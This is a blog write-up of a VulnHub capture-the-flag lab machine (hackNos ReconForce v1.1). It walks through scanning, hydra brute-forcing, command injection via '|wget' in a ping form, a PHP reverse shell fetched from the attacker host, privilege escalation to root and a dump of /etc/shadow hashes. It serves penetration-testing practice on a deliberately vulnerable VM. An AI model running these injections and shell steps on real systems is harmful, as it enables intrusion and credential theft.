<html lang="en">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
        <title>/f0c1s/blog/sec/vulnhub/hackNos-reconforce-1.1</title>
        <link rel="stylesheet" href="../../../index.css"/>
        <link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
        <script src="../../../highlight/highlight.min.js"></script>
        <script src="../../../setup.js"></script>
        <script>hljs.highlightAll();</script>
    </head>
<body onload="setup()">
<h1>/f0c1s/blog/sec/vulnhub/hackNos-reconforce-1.1</h1>

<nav>
    <a href="../../../index.html">/blog</a>
    <a href="../../index.html">Security</a>
    <a href="../index.html">VulnHub</a>
    <a href="../../../sec/vulnhub/hackNos-ReconForce-1.1/hackNos-ReconForce-1.1.html">+ hackNos: reconforce v1.1 - 2022.01.01 Saturday</a>
</nav>

## Description

>
> Good Enumeration Skills
>
> Difficulty: Easy to Intermediate
>
> Flag: 2 Flag first user And the second root
>
> Learning: Web Application | Enumeration | Privilege Escalation
>
> Web-site: www.hacknos.com
>
> Contact-us
>
> Twitter: @rahul_gehlaut
> \## Changelog v1.1 - 2020-01-18 v1.0 - 2020-01-11
>

[VulnHub: https://www.vulnhub.com/entry/hacknos-reconforce-v11,416/](https://www.vulnhub.com/entry/hacknos-reconforce-v11,416/)
[Series: https://www.vulnhub.com/series/hacknos,257/](https://www.vulnhub.com/series/hacknos,257/)

![0.running-box](0.running-box.png)

## Scanning

```shell
fping -aAqg 192.168.56.1/24 | tee fping.txt
192.168.56.1
192.168.56.2
192.168.56.60
192.168.56.70

```

```shell
sudo netdiscover -r 192.168.56.1/24 -i eth1 -PN
[sudo] password for f0c1s:
 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor
 192.168.56.2    08:00:27:11:4f:2a      1      60  PCS Systemtechnik GmbH
 192.168.56.60   08:00:27:9d:aa:10      1      60  PCS Systemtechnik GmbH

-- Active scan completed, 3 Hosts found.

```

```shell
sudo arp-scan -I eth1 -l
Interface: eth1, type: EN10MB, MAC: 08:00:27:13:e5:7a, IPv4: 192.168.56.70
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.2    08:00:27:11:4f:2a       PCS Systemtechnik GmbH
192.168.56.60   08:00:27:9d:aa:10       PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.036 seconds (125.74 hosts/sec). 3 responded

```

```shell
nmap 192.168.56.1/24 -sn -n
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-01 09:54 IST
Nmap scan report for 192.168.56.60
Host is up (0.0016s latency).
Nmap scan report for 192.168.56.70
Host is up (0.0017s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.51 seconds

```

```shell
export RHOST="192.168.56.60"
export LHOST="192.168.56.70"
export LPORT="443"

```

```shell
_n $RHOST
firing nmap 192.168.56.60 | tee nmap.default.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-01 09:55 IST
Nmap scan report for 192.168.56.60
Host is up (0.00026s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds

```

```shell
_ntd $RHOST
firing nmap 192.168.56.60 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-01 09:55 IST
Nmap scan report for 192.168.56.60
Host is up (0.00015s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.70
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA)
|   256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA)
|_  256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Recon_Web
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds

```

## FTP

```shell
ftp -p $RHOST 21
Connected to 192.168.56.60.
220 "Security@hackNos".
Name (192.168.56.60:f0c1s): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||34458|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        117          4096 Jan 06  2020 .
drwxr-xr-x    2 0        117          4096 Jan 06  2020 ..
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> cwd
?Invalid command.
ftp> dir
229 Entering Extended Passive Mode (|||55040|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> exit
221 Goodbye.

```

There is nothing here. Maybe I can upload something?

```shell
cp ~/collected-tools/php-reverse-shell/php-reverse-shell.php rshell.php

```

```shell
ftp -p $RHOST 21
Connected to 192.168.56.60.
220 "Security@hackNos".
Name (192.168.56.60:f0c1s): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put rshell.php
local: rshell.php remote: rshell.php
229 Entering Extended Passive Mode (|||26312|)
550 Permission denied.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> put rshell.php
local: rshell.php remote: rshell.php
200 EPRT command successful. Consider using EPSV.
550 Permission denied.
ftp> exit
221 Goodbye.

```

## Attacking SSH

```shell
ssh root@$RHOST
The authenticity of host '192.168.56.60 (192.168.56.60)' can't be established.
ED25519 key fingerprint is SHA256:wnj/RTNHqFD0k0kZlCBtCwiBzGMt8nAMig6bZc4j5is.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.60' (ED25519) to the list of known hosts.
root@192.168.56.60's password:
Permission denied, please try again.
root@192.168.56.60's password:


```

Without password there is no access.

## Attacking web

```shell
nikto -C all -host http://$RHOST | tee nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.60
+ Target Hostname:    192.168.56.60
+ Target Port:        80
+ Start Time:         2022-01-01 09:56:03 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /, inode: 294, size: 59bd0f09b74ac, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ 26523 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-01-01 09:57:28 (GMT5.5) (85 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

![1.css-directory](1.css-directory.png)

### Is CSS actually whitespace code?

![2.nope-no-whitespace-code](2.nope-no-whitespace-code.png)

The weird formatting of CSS file hinted towards it.

### Does image have anything hidden

```shell
wget -q http://192.168.56.60/css/2.jpg

```

```shell
ls
2.jpg  fping.txt  nikto.txt  nmap.default.txt  nmap.tcp-ports.deep.txt

```

```shell
exiftool 2.jpg
ExifTool Version Number         : 12.36
File Name                       : 2.jpg
Directory                       : .
File Size                       : 490 KiB
File Modification Date/Time     : 2019:03:01 07:54:37+05:30
File Access Date/Time           : 2022:01:01 10:08:47+05:30
File Inode Change Date/Time     : 2022:01:01 10:08:47+05:30
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1920
Image Height                    : 1281
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1920x1281
Megapixels                      : 2.5

```

```shell
feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
301        9l       28w      312c http://192.168.56.60/css
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_56_60-1641012029.state ...
Scanning: http://192.168.56.60
Scanning: http://192.168.56.60/css

```

Nothing here.

### Source code

![3.found-a-directory](3.found-a-directory.png)

![4.auth-prompt](4.auth-prompt.png)

![5.unauthorized](5.unauthorized.png)

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.56.60 Port 80</address>
</body></html>
```

I can try to attack the auth mechanism via hydra, but I don't have a username.

## Look at the output Ben

Well, I didn't look at the ftp output. There is this string: "Security@hackNos". It could be username or password.

We have a login form. Here are a few things I can try:

- Security:hackNos
- admin:Security@hackNos
- Security@hackNos:admin

## hydra

```shell
cat users.txt
Security@hackNos
Security
admin
ftp
anonymous

```

```shell
cat passwords.txt
Security@hackNos
hackNos
admin
anonymous

```

```shell
hydra -L users.txt -P passwords.txt $RHOST -s 80 http-get "/5ecure"
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-01 10:40:41
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:5/p:4), ~2 tries per task
[DATA] attacking http-get://192.168.56.60:80/5ecure
[80][http-get] host: 192.168.56.60   login: admin   password: Security@hackNos
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 10:40:41

```

```shell
hydra -L users.txt -P passwords.txt $RHOST ftp
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-01 10:41:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:5/p:4), ~2 tries per task
[DATA] attacking ftp://192.168.56.60:21/
[21][ftp] host: 192.168.56.60   login: ftp   password: Security@hackNos
[21][ftp] host: 192.168.56.60   login: ftp   password: hackNos
[21][ftp] host: 192.168.56.60   login: ftp   password: admin
[21][ftp] host: 192.168.56.60   login: ftp   password: anonymous
[21][ftp] host: 192.168.56.60   login: anonymous   password: Security@hackNos
[21][ftp] host: 192.168.56.60   login: anonymous   password: hackNos
[21][ftp] host: 192.168.56.60   login: anonymous   password: admin
[21][ftp] host: 192.168.56.60   login: anonymous   password: anonymous
1 of 1 target successfully completed, 8 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 10:41:11

```

This basically means that ftp server is allowing anonymous login with ftp or anonymous as users.

```shell
hydra -L users.txt -P passwords.txt $RHOST ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-01 10:41:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:5/p:4), ~2 tries per task
[DATA] attacking ssh://192.168.56.60:22/
1 of 1 target completed, 0 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 10:41:20

```

![6.hydra](6.hydra.png)

## webshell

There is poor man's webshell after logging in as admin:Security@hackNos

![7.poor-mans-webshell](7.poor-mans-webshell.png)

![8.localhost-ping-results](8.localhost-ping-results.png)

## RFI

```
|wget 192.168.56.70/not_found
|wget 192.168.56.70/rshell.php
```

```shell
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.56.60 - - [01/Jan/2022 10:52:31] code 404, message File not found
192.168.56.60 - - [01/Jan/2022 10:52:31] "GET /not_found HTTP/1.1" 404 -
192.168.56.60 - - [01/Jan/2022 10:53:39] "GET /rshell.php HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

```

## Reverse shell

```
|php rshell.php
```

```shell
sudo nc -nlvp $LPORT -s $LHOST
[sudo] password for f0c1s:
Listening on 192.168.56.70 443
Connection received on 192.168.56.60 50590
Linux hacknos 5.3.0-24-generic #26-Ubuntu SMP Thu Nov 14 01:33:18 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 10:54:36 up  1:02,  0 users,  load average: 0.07, 0.02, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ hostname
hacknos
$ date
Sat Jan  1 10:54:57 UTC 2022
$
```

![9.caught-a-reverse-shell](9.caught-a-reverse-shell.png)

### pty

```shell
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@hacknos:/home/recon$
```

### /home users

```shell
www-data@hacknos:/home/recon$ cat /etc/passwd | grep /home
cat /etc/passwd | grep /home
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
recon:x:1000:119:rahul:/home/recon:/bin/bash

```

### /var/www/recon/5ecure/out.php

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

### systeminfo

```shell
www-data@hacknos:/$ uname -a
uname -a
Linux hacknos 5.3.0-24-generic #26-Ubuntu SMP Thu Nov 14 01:33:18 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
www-data@hacknos:/$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=19.10
DISTRIB_CODENAME=eoan
DISTRIB_DESCRIPTION="Ubuntu 19.10"
NAME="Ubuntu"
VERSION="19.10 (Eoan Ermine)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 19.10"
VERSION_ID="19.10"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=eoan
UBUNTU_CODENAME=eoan
```

## Root

```shell
www-data@hacknos:/$ su recon
su recon
Password: Security@hackNos

recon@hacknos:/$ sudo -l
sudo -l
[sudo] password for recon: Security@hackNos

Matching Defaults entries for recon on hacknos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User recon may run the following commands on hacknos:
    (ALL : ALL) ALL
recon@hacknos:/$ sudo bash -i
sudo bash -i
root@hacknos:/# whoami
whoami
root
root@hacknos:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@hacknos:/# hostname
hostname
hacknos
root@hacknos:/# date
date
Sat 01 Jan 2022 11:15:41 AM UTC
root@hacknos:/# cat /etc/shadow
cat /etc/shadow
root:$6$81XnMBZhj4s7PUbZ$oXgkpES1EwkWwk/47iHKsCPxC6mlaG2lqPj2K2dcqxHd/n5skrZ/KTEsIWP5AEdsRFjd.h6oUXZK55QSbi7Lh.:18271:0:99999:7:::
daemon:*:18186:0:99999:7:::
bin:*:18186:0:99999:7:::
sys:*:18186:0:99999:7:::
sync:*:18186:0:99999:7:::
games:*:18186:0:99999:7:::
man:*:18186:0:99999:7:::
lp:*:18186:0:99999:7:::
mail:*:18186:0:99999:7:::
news:*:18186:0:99999:7:::
uucp:*:18186:0:99999:7:::
proxy:*:18186:0:99999:7:::
www-data:*:18186:0:99999:7:::
backup:*:18186:0:99999:7:::
list:*:18186:0:99999:7:::
irc:*:18186:0:99999:7:::
gnats:*:18186:0:99999:7:::
nobody:*:18186:0:99999:7:::
systemd-timesync:*:18186:0:99999:7:::
systemd-network:*:18186:0:99999:7:::
systemd-resolve:*:18186:0:99999:7:::
messagebus:*:18186:0:99999:7:::
syslog:*:18186:0:99999:7:::
_apt:*:18186:0:99999:7:::
uuidd:*:18186:0:99999:7:::
tcpdump:*:18186:0:99999:7:::
landscape:*:18186:0:99999:7:::
pollinate:*:18186:0:99999:7:::
sshd:*:18267:0:99999:7:::
systemd-coredump:!!:18267::::::
recon:$6$e3kpkVkMU5.i8kCu$GdUZ5tPcXWBbXaFDekVWqMB.CDBWbZAdW4VU5acfPTjpki4lqckCofK6qjfO7dF0AMBNA.Lw61Kr1IXczvTLM.:18271:0:99999:7:::
lxd:!:18267::::::
ftp:$6$XzGaISMJDIacZa9Y$DU1IjrBSBR11rWcc//ovH1qS082XDeC1Xi5Z8LHdjl.K..drbahsOmQxSVIeuwXJwVYsobC8BXWtnnKfzi.80.:18271:0:99999:7:::
mysql:!:18271:0:99999:7:::
dnsmasq:*:18271:0:99999:7:::
```

Rooted.

## SSH

```shell
ssh recon@$RHOST
recon@192.168.56.60's password:
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 01 Jan 2022 11:17:26 AM UTC

  System load:  0.05              Processes:             130
  Usage of /:   31.5% of 9.22GB   Users logged in:       0
  Memory usage: 7%                IP address for enp0s3: 192.168.56.60
  Swap usage:   0%

  => There is 1 zombie process.


31 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Jan 10 23:05:02 2020 from 192.168.0.104
recon@hacknos:~$ whoami
recon
recon@hacknos:~$ id
uid=1000(recon) gid=119(docker) groups=119(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)
recon@hacknos:~$ date
Sat 01 Jan 2022 11:17:32 AM UTC
recon@hacknos:~$ hostname
hacknos
recon@hacknos:~$ sudo -l
[sudo] password for recon:
Matching Defaults entries for recon on hacknos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User recon may run the following commands on hacknos:
    (ALL : ALL) ALL
recon@hacknos:~$ sudo bash
root@hacknos:/home/recon# id
uid=0(root) gid=0(root) groups=0(root)
root@hacknos:/home/recon# whoami
root
root@hacknos:/home/recon# exit
exit
recon@hacknos:~$ exit
logout
Connection to 192.168.56.60 closed.

```

![10.rooted](10.rooted.png)

## How to hack

1. Find hidden web directory
2. Find password via enumerating other services.
3. Upload reverse shell via your web server.
4. Execute reverse shell script and catch a shell.
5. Find users.
6. Become one.
7. Find what it can do.
8. Become root.
